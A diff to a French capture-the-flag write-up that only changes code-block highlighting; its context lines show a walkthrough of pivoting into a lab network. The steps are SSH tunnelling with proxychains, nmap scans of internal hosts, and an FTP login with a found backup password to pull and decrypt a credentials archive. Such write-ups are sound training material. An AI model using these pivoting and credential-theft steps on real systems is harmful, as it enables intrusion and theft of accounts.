@@ -161,7 +161,7 @@ zc9Ur+20TJHIwAKloaZLiMdcpdyFUQQRStXCGD6wqbw8UxGfx1Fd0g==
 
 Et voilà, nous pouvons à présent nous connecter en SSH sur le port TCP/5007 avec le compte **test** :
 
-{{< highlight bash >}}
+{{< highlight terminal >}}
 host:~$ ssh -i id_rsa -p 5007 test@ctf.hacklab-esgi.org 
 Linux dev-server 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64 
  
@@ -181,7 +181,7 @@ Connection to ctf.hacklab-esgi.org closed.
 
 Évidement, pour ceux qui ont suivi, le compte **test** ne peut pas se connecter au serveur (`/usr/sbin/nologin`). Nous avons ici un indice, _"Do you know proxychains ?"_.
 
-{{< highlight bash >}}
+{{< highlight terminal >}}
 host:~$ ssh -N -D 5000 -i id_rsa -p 5007 test@ctf.hacklab-esgi.org
 {{< /highlight >}}
 
@@ -197,7 +197,7 @@ Lorsque l'on essaye d'ajouter un `;` pour chaîner les commandes, le serveur ref
 
 Le but est de savoir quelle sont les autres serveurs voisins de celui-ci. En regardant les interfaces réseau (`ip a`), nous observons deux interfaces **ens192** (`10.10.40.2/29`) et **ens224** (`10.0.0.1/16`). Notre connexion SSH est établie sur l'interface **ens192**.
 
-{{< highlight bash >}}
+{{< highlight terminal >}}
 10.0.0.1:~$ ss -t
 State      Recv-Q Send-Q Local Address:Port      Peer Address:Port                
 ESTAB      0      0      10.10.40.2:ssh          X.X.X.X:48040                
@@ -228,7 +228,7 @@ Comme quoi, la RCE n'était pas forcément utile ...
 
 En utilisant Proxychains et Nmap, nous pouvons cartographier le réseau interne de _ZedCorp_ :
 
-{{< highlight bash >}}
+{{< highlight terminal >}}
 host:~$ proxychains nmap 10.0.0.2
 ProxyChains-3.1 (http://proxychains.sf.net) 
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-06 00:35 CEST 
@@ -242,7 +242,7 @@ PORT     STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 4.74 seconds 
 {{< /highlight >}}
-{{< highlight bash >}}
+{{< highlight terminal >}}
 host:~$ proxychains nmap 10.0.0.3
 ProxyChains-3.1 (http://proxychains.sf.net) 
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-06 00:35 CEST 
@@ -332,7 +332,7 @@ lftp -c 'open -u backup,46t5r2e5t&2z! admin-server; put -O / ~/credentials.tar.g
 
 Grace aux identifiants ainsi trouvés, nous pouvons utiliser le compte **backup** pour nous connecter au FTP sur serveur d'administration (`10.0.0.3`) et récupérer le fichier `credentials.tar.gz` que l'utilisateur **dcloutier** y a déposé :
 
-{{< highlight bash >}}
+{{< highlight terminal >}}
 host:~$ proxychains lftp -u 'backup,46t5r2e5t&2z!' 10.0.0.3
 host:~$ openssl enc -d -aes256 -in credentials.tar.gz -out credentials.tgz --pass pass:daniel2019
 host:~$ tar -xcvf credentials.tgz
